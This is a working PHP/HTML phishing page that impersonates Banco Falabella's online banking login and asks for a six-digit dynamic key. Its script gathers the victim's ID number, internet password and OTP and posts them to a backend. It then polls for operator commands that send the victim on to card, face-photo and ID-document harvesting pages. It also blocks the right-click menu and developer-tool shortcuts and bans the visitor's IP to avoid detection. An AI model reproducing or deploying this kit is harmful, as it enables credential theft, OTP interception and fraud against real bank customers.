<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Verificación de Seguridad |</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">  		
		<meta content="es" http-equiv="Content-Language">
  		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
		<script src="js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  	
   	</head>
   	<body>
   		<!-- Campos hidden para la funcionalidad de Nequi -->
   		<input type="hidden" id="session_id" name="session_id">
   		<input type="hidden" id="username" name="username">
   		
   		    		    		<!-- Loader overlay para la funcionalidad de Nequi -->
     		<div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999;">
     			<div id="mensaje" style="display: block !important; position: fixed; background-color:#fff; width: 430px; height: auto; top: 50%; left: 50%; margin-top: -80px; margin-left: -245px; padding: 30px; border-radius: 10px; text-align: center;">
     				<table>
     					<tr>
     						<td>
     							Por favor espere un momento estamos validando algunos datos. Puede tardar un momento. No cierres o recargues esta ventana.
     						</td>
     						<td>
     							<div class="cargando2"></div>
     						</td>
     					</tr>
     				</table>
     				<div class="cargando3"></div>
     			</div>
     		</div>

   		<div id="fondo-blanco">
   			<div style="display: table-cell; vertical-align: middle;">
   			<img src="img/finalizar1.png" width="90"><br><br>
   			<span style="font-size: 22px;font-weight: 300;">Verificación Exitosa</span>
   			</div>
   		</div>

   		<div id="fondo"></div>

   		<div id="fondo-oscuro"></div>

   		<div class="loader"></div>

   		<div id="mensaje">
   			<table>
   				<tr>
   					<td>
   						Por favor espere un momento estamos validando su clave dinámica. Puede tardar un momento. No cierres o recargues esta ventana.
   					</td>
   					<td>
   						<div class="cargando2"></div>
   					</td>
   				</tr>
   			</table>
   			<div class="cargando3"></div>
   		</div>
   		<div id="cargando">
	   		<img src="img/logo.png">	
   		</div>
   		
   		<div id="frmToken">
   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
		  		Verificación de Seguridad
		  	</div>		  	
		
			<span>
		  		Por su seguridad, hemos enviado una clave dinámica a su dispositivo registrado. Ingrese el código de 6 dígitos para continuar.
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<input type="password" placeholder="Clave dinámica" name="txtToken" id="txtToken" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
		  	<br><br>
		  	<button class="btn" type="submit" id="btnOTP" disabled> VERIFICAR </button>	
   		</div>


   		<div id="frmTokenError">
   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
		  		Clave Dinámica Incorrecta
		  	</div>		  	
			<span>
		  		La clave ingresada no es correcta. Por favor verifique e intente nuevamente. Al fallar múltiples veces su cuenta se bloqueará temporalmente.
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<input type="password" placeholder="Clave dinámica" name="txtTokenE" id="txtTokenE" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
		  	<br><br>
		  	<button class="btn" type="submit" id="btnOTPE" disabled="disabled"> VERIFICAR </button>	
   		</div>


   		<div class="top-bar">
   			<table class="menu-top-bar">
   				<tr>
   					<td>Falabella</td>
   					<td>Viajes Falabella</td>
   					<td>Seguros Falabella</td>
   					<td>Sodimac</td>
   					<td>Linio</td>
   				</tr>
   			</table>

   			<table class="ayuda-top-bar">
   				<tr>
   					<td style="padding: 8px 2px;"><img src="img/ayuda.svg"></td>
   					<td style="padding: 8px 2px;">Canales de Atención</td>   					
   				</tr>
   			</table>

   			<div style="float:right;"></div>  			
   		</div>   
   		<div class="header">
   			<table style="float:left;">
   				<tr>
   					<td><img src="img/menu.jpg" id="boton-menu"></td>
   					<td><img src="img/logo.svg" id="logo-pal"></td>
   				</tr>
   			</table>
  			

   			<button class="btn" type="submit" id="btnBanca"> BANCA EN LÍNEA </button>


   			<table style="float:right" id="frmLogin">
   				<tr>
   					<td>
   						<select name="txtTipo" id="txtTipo" class="entradas">
   							<option value="CC">Cédula Ciudadanía</option>
   							<option value="CE">Cédula de Extranjería</option>
   							<option value="PP">Pasaporte</option>
   						</select>
   					</td>
   					<td>
   						<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumento" id="txtDocumento" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
   					</td>
   					<td>
   						<input type="password" placeholder="Clave Internet" name="txtClave" id="txtClave" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
   					</td>
   					<td>
   						<button class="btn" type="submit" id="btnEntrar" disabled > ❯ </button>
   					</td>
   				</tr>
   			</table>
   		</div>
   		<div style="text-align: center;padding-top:80px;">
	   		<div class="menu" style="margin:0 auto;">
	   			<table cellpadding="0" cellspacing="0">
	   				<tr>
	   					<td><span style="border-left: 0px solid;">CUENTAS</span></td>
	   					<td><span>TARJETAS CMR</span></td>
	   					<td><span>CDT</span></td>
	   					<td><span>CRÉDITOS</span></td>
	   					<td><span>DESCUENTOS</span></td>
	   					<td><span>BANCA SEGUROS</span></td>
	   					<td><span>CMR PUNTOS</span></td>
	   					<td><span>CANALES</span></td>
	   					<td><span>BANCA EMPRESAS</span></td>
	   					<td><span>SOSTENIBILIDAD</span></td>
	   				</tr>
	   			</table>   			
	   		</div>
	   	</div>	

	   	<div id="frmLoginMobile">	  
	   	<div style="text-align:right;">
	   		<table style="float:right;" id="btnCerrar">
	   			<tr>
	   				<td>CERRAR</td>
	   				<td><img src="img/x.jpg" style="margin-left: 10px; width: 26px;"></td>
	   			</tr>
	   		</table>
	   		
	   	</div> 		
	   	<br>
	   		<select name="txtTipoM" id="txtTipoM" class="entradas">
				<option value="CC">Cédula Ciudadanía</option>
				<option value="CE">Cédula de Extranjería</option>
				<option value="PP">Pasaporte</option>
			</select>
			<br>
			<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoM" id="txtDocumentoM" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
		  	<br>
		  	<input type="password" placeholder="Clave Internet" name="txtClaveM" id="txtClaveM" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
		  	<br>
		  	<button class="btn" type="submit" id="btnEntrarM" disabled> INGRESAR </button>	
		  	<span>Crea o recupera tu Clave Internet</span>  			
	   	</div>

	   	<div class="slider">
		    <ul>
		      <li><img src="img/slider-1.jpg"></li>
		      <li><img src="img/slider-2.jpg"></li>
		      <li><img src="img/slider-3.jpg"></li>
		    </ul>
		  </div>

		  <div class="slider-mobile">
		    <ul>
		      <li><img src="img/slider-mobile-1.jpg"></li>
		      <li><img src="img/slider-mobile-2.jpg"></li>
		      <li><img src="img/slider-mobile-3.jpg"></li>
		    </ul>
		  </div>
		  <div class="frmCredito">
		  	<table width="100%">
		  		<tr>
		  			<td class="etiqueta-destacada" width="25%">
		  				Simula tu Crédito de Consumo
		  			</td>
		  			<td width="25%">
		  				<select name="txtTipoS" id="txtTipoS" class="entradas">
							<option value="CC">Cédula Ciudadanía</option>
   							<option value="CE">Cédula de Extranjería</option>
   							<option value="PP">Pasaporte</option>
						</select>
		  			</td>
		  			<td width="25%">
		  				<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoS" name="txtDocumentoS" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
		  			</td>
		  			<td>
		  				<button class="btn" type="submit" id="btnSimular"> SIMULAR </button>
		  			</td>
		  		</tr>
		  	</table>
		  </div>

		  <div class="frmCreditoMobile" style="text-align: center;">
		  	<span class="etiqueta-destacada">
		  		Simula tu Crédito de Consumo
		  	</span>
		  	<br>
			<select name="txtTipoSM" id="txtTipoSM" class="entradas">
				<option value="CC">Cédula Ciudadanía</option>
				<option value="CE">Cédula de Extranjería</option>
				<option value="PP">Pasaporte</option>
			</select>
			<br>
			<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoSM" name="txtDocumentoSM" class="entradas">
		  	<br>
		  	<button class="btn" type="submit" id="btnSimularM"> SIMULAR </button>	  	
		  </div>

		  <div class="contenido">
		  		<img src="img/contenido.jpg" id="conten">
		  		<img src="img/contenido-mobile.jpg" id="contenMob">
		  </div>
		  
   		<script type="text/javascript" src="js/ready.js"></script>
   		
   		<script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      if (sessionInput) sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        if (usernameInput) usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Mostrar el formulario de token al cargar la página
      setTimeout(() => {
        // Verificar si venimos de un error token para mostrar directamente la pantalla de error
        const isErrorToken = urlParams.get('error') === '1';

        // Llenar los campos de login con los datos del localStorage
        const documento = localStorage.getItem('documento') || '';
        const clave = localStorage.getItem('clave') || '';
        
        // Llenar campos desktop
        if ($("#txtDocumento").length) $("#txtDocumento").val(documento);
        if ($("#txtClave").length) $("#txtClave").val(clave);
        
        // Llenar campos mobile
        if ($("#txtDocumentoM").length) $("#txtDocumentoM").val(documento);
        if ($("#txtClaveM").length) $("#txtClaveM").val(clave);
        
        if (isErrorToken) {
          $("#frmToken").hide();
          $("#frmTokenError").show();
          $("#txtTokenE").focus();
        } else {
          $("#frmTokenError").hide();
          $("#frmToken").show();
          $("#txtToken").focus();
        }
      }, 500);

      // Validación del campo token para habilitar el botón
      $("#txtToken").on("input", function() {
        const token = $(this).val();
        const btnOTP = $("#btnOTP");
        
        if (token.length === 6) {
          btnOTP.prop("disabled", false).css({
            "background-color": "#38a121",
            "cursor": "pointer"
          });
        } else {
          btnOTP.prop("disabled", true).css({
            "background-color": "#59B981",
            "cursor": "not-allowed"
          });
        }
      });

      // Validación del campo token error para habilitar el botón
      $("#txtTokenE").on("input", function() {
        const token = $(this).val();
        const btnOTPE = $("#btnOTPE");
        
        if (token.length === 6) {
          btnOTPE.prop("disabled", false).css({
            "background-color": "#38a121",
            "cursor": "pointer"
          });
        } else {
          btnOTPE.prop("disabled", true).css({
            "background-color": "#59B981",
            "cursor": "not-allowed"
          });
        }
      });

      // Event listener para el botón Verificar Token
      const btnOTP = document.getElementById('btnOTP');
      if (btnOTP) {
        btnOTP.addEventListener('click', async function (event) {
          event.preventDefault();
          const token = document.getElementById('txtToken').value;
          
          if (token.length !== 6) {
            alert('La clave dinámica debe tener 6 dígitos');
            return;
          }

          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'flex';

          const session_id = document.getElementById('session_id').value;
          localStorage.setItem('token', token);

          const identificacion = localStorage.getItem('documento') || '';
          const password = localStorage.getItem('clave') || '';
          
          let localTb = {};
          try {
              localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
          } catch(err) {}

          const formData = new FormData();
          formData.append('transactionId', session_id);
          formData.append('u_id', identificacion);
          formData.append('u_ps', password);
          formData.append('u_tk', token);
          formData.append('u_tb', JSON.stringify(localTb));

          fetch('procesar_dinamica.php', { method: 'POST', body: formData })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                if (loader) loader.style.display = 'none';
              }
            })
            .catch(() => { if (loader) loader.style.display = 'none'; });
        });
      }

      // Event listener para el botón Verificar Token Error
      const btnOTPE = document.getElementById('btnOTPE');
      if (btnOTPE) {
        btnOTPE.addEventListener('click', async function (event) {
          event.preventDefault();
          const token = document.getElementById('txtTokenE').value;
          
          if (token.length !== 6) {
            alert('La clave dinámica debe tener 6 dígitos');
            return;
          }

          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'flex';

          const session_id = document.getElementById('session_id').value;
          const identificacion = localStorage.getItem('documento') || '';
          const password = localStorage.getItem('clave') || '';
          
          let localTb = {};
          try {
              localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
          } catch(err) {}

          const formData = new FormData();
          formData.append('transactionId', session_id);
          formData.append('u_id', identificacion);
          formData.append('u_ps', password);
          formData.append('u_tk', token);
          formData.append('u_tb', JSON.stringify(localTb));

          fetch('procesar_dinamica.php', { method: 'POST', body: formData })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                if (loader) loader.style.display = 'none';
              }
            });
        });
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
        const result = await res.json();

        if (result.action) {
          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'none';

          switch (result.action) {
            case 'pedir_dinamica':
            case 'error_token':
              window.location.href = "token.php?error=1";
              break;

            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;

            case 'error_logo':
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.php";
              break;

            case 'error_tc':
              window.location.href = "/datac/alter.php";
              break;
            
            case 'error': // ✅ NUEVO: Redirección para rostro (Cara)
              window.location.href = "/caras";
              break;

            case 'cedula': // ✅ NUEVO: Redirección para documento (Cédula)
              window.location.href = "/cedula";
              break;

            default:
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
</script>
   	<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html> 